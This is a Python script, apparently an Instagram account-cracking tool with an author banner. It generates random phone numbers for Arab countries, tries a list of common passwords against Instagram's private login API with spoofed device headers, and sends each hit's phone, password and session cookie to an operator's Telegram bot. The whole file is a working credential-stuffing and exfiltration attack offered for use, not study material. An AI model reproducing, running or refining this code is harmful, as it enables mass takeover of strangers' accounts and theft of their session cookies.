import os
try:
  import requests  
  import random
  from rich.console import Console
  from rich.table import Table
  from rich.text import Text
  from concurrent.futures import ThreadPoolExecutor    
  import uuid
  from OneClick import Hunter
except:
  os.system("pip install requests bs4 rich OneClick stdiomask")

import requests
import random
from rich.console import Console
from rich.table import Table
from rich.text import Text
from concurrent.futures import ThreadPoolExecutor
import os
import json
import sys
import requests
import uuid
from time import time
from secrets import token_hex
from OneClick import Hunter
from time import sleep


gg = 0
bb = 0

console = Console()




E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'
memo = random.randint(100, 300)
O = f'\x1b[38;5;{memo}m'
def nx():
    os.system("clear")
    Banner = f"""{B}{E}=============================={B}
|{F}[+] YouTube    : {B}| أحمد الحراني 
|{F}[+] TeleGram   : {B} maho_s9    
|{F}[+] Instagram  : {B} ahmedalharrani 
|{F}[+] Tool       : {B} انتسغرام دول
{E}==============================
"""
    for mm in Banner.splitlines():
        sleep(0.05)
        print(mm)

nx()
token = input(f' {F}({M}1{F}) {M} Enter Token{F}  ' + O)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({M}2{F}) {M} Enter ID{F}  ' + O)




arab = {
    'YE': ('Yemen-اليمن', '+967', 9, ['71', '77', '73', '70']),
    'IQ': ('Iraq-العراق', '+964', 10, ['78', '77', '75']),
    'SA': ('Soudi-السعودية', '+966', 9, ['50', '56', '59']),
    'JO': ('Jordon-الأردن', '+962', 9, ['79', '77', '78']),
    'PS': ('Phalsten-فلسطين', '+970', 9, ['59', '56']),
    'EG': ('Egypt-مصر', '+20', 10, ['10', '12', '11', '15']),
    'LB': ('Labnan-لبنان', '+961', 8, ['3', '70']),
    'SY': ('Syria-سوريا', '+963', 9, ['93', '94']),
    'DZ': ('Dzair-الجزائر', '+213', 9, ['66', '77', '79']),
    'MA': ('Moraco-المغرب', '+212', 9, ['6', '5', '7']),
    'TN': ('Tones-تونس', '+216', 8, ['9', '2', '5']),
    'LY': ('Lebya-ليبيا', '+218', 9, ['91', '92']),
    'SD': ('Sudan-السودان', '+249', 9, ['91', '95', '92']),
    'MR': ('Muratnia-موريتانيا', '+222', 8, ['22', '36', '44']),
    'OM': ('Oman-عمان', '+968', 8, ['9', '7', '8']),
    'AE': ('USE-الإمارات', '+971', 9, ['50', '55']),
    'KW': ('kowit-الكويت', '+965', 8, ['9', '6', '5']),
    'BH': ('bhrain-البحرين', '+973', 8, ['3', '36', '33'])
}

def get_flag(country_code):
    if len(country_code) == 2 and country_code.isalpha():
        country_code = country_code.upper()
        flag_offset = 127397
        return ''.join(chr(ord(char) + flag_offset) for char in country_code)
    return ""

def login(phone, password):
    global gg, bb
    total = gg + bb    
    headers = {
            "X-FB-Client-IP": "True",
            "X-IG-Connection-Type": "WiFi",
            "Accept-Language": "en-EN;q=1.0",
            "x-fb-rmd": "state=URL_ELIGIBLE",
            "Host": "i.instagram.com",
            "X-IG-Capabilities": "36r/F/8=",
            "X-Bloks-Version-Id": str(token_hex(8) * 4),
            "X-IG-App-Locale": "en",
            "X-IG-ABR-Connection-Speed-KBPS": "130",
            "X-IG-Timezone-Offset": "10800",
            "X-IG-Mapped-Locale": "en_EN",
            "Connection": "keep-alive",
            "X-IG-App-ID": "124024574287414",
            "X-FB-Friendly-Name": "api",
            "X-IG-Bandwidth-Speed-KBPS": "303.000",
            "X-Bloks-Is-Panorama-Enabled": "true",
            "Priority": "u=2, i",
            "X-Pigeon-Rawclienttime": str(time()),
            "User-Agent": Hunter.Services(),
            "X-IG-Family-Device-ID": str(uuid.uuid4()),
            "X-MID": str(token_hex(8) * 2),
            "X-Tigon-Is-Retry": "False",
            "Content-Length": "860",
            "X-FB-Connection-Type": "wifi",
            "X-IG-Device-ID": str(uuid.uuid4()),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-FB-Server-Cluster": "True",
            "X-IG-Connection-Speed": "0kbps",
            "IG-INTENDED-USER-ID": "0",
            "X-IG-Device-Locale": "en-JO",
            "X-FB-HTTP-Engine": "Liger"
        }

    data = {
            "phone_id": str(uuid.uuid4()),
            "reg_login": "0",
            "device_id": str(uuid.uuid4()),
            "has_seen_aart_on": "0",
            "username": phone,
            "adid": str(uuid.uuid4()),
            "login_attempt_count": "0",
            "enc_password": f"#PWD_INSTAGRAM:0:{str(int(time()))}:{password}"
        }
        
    url = 'https://i.instagram.com/api/v1/accounts/login/'
    res = requests.post(url, headers=headers, data=data)
    
    table = Table(title=f"{O}Instagram CC")
    table.add_column("Type", justify="center", style="cyan", no_wrap=True)
    table.add_column("Count", justify="center", style="magenta")
    if 'logged_in_user' in res.text:
        coki = res.cookies['sessionid']
        gg += 1
        tlg = f"Good Instagram:\nPhone: {phone}\nPassword: {password}\nSessionId: {coki}\nDev: @maho_s9 ~~ @maho9s"
        requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
    else:
        bb += 1
    
    
    os.system('clear')
    table.add_row("Good Hunting", Text(str(gg), style="green"))
    table.add_row("Bad Hunting", Text(str(bb), style="red"))
    table.add_row("Total Checker", Text(str(total), style="yellow"))
    table.add_row("Dev", "AHMED ~~ @maho_s9")
    console.print(table)

def ph(country):
    code, nums, pr = arab[country][1:]
    fis = random.choice(pr)
    num = ''.join(random.choices('0123456789', k=nums - len(fis)))
    return code + fis + num
    
def Bmw():
    console.clear()
    table = Table(title="اختر الدولة")
    table.add_column("رقم")
    table.add_column("الدولة")        
    bokemon = list(arab.items())    
    for i, (code, (name, _, _, _)) in enumerate(bokemon, start=1):
        flag = get_flag(code)
        table.add_row(str(i), name+flag)   
    console.print(table)    
    choice = int(input(f"{O}Enter The Country Number - أدخل رقم الدولة : {F} ")) - 1
    if 0 <= choice < len(bokemon):
        country_code = bokemon[choice][0]
        phone = ph(country_code)        
        with ThreadPoolExecutor(max_workers=2) as pool:
            while True:
                phone = ph(country_code)
                bmw = ['0770777', 'Aa12345678', 'qwaszx', 'polkmn', '20052005', '12341234@@', '1234567', '١٢٣٤٥٦', '19901990', '19801980', phone[-7:]]
                for password in bmw:
                    pool.submit(login, phone, password)
                    

Bmw()
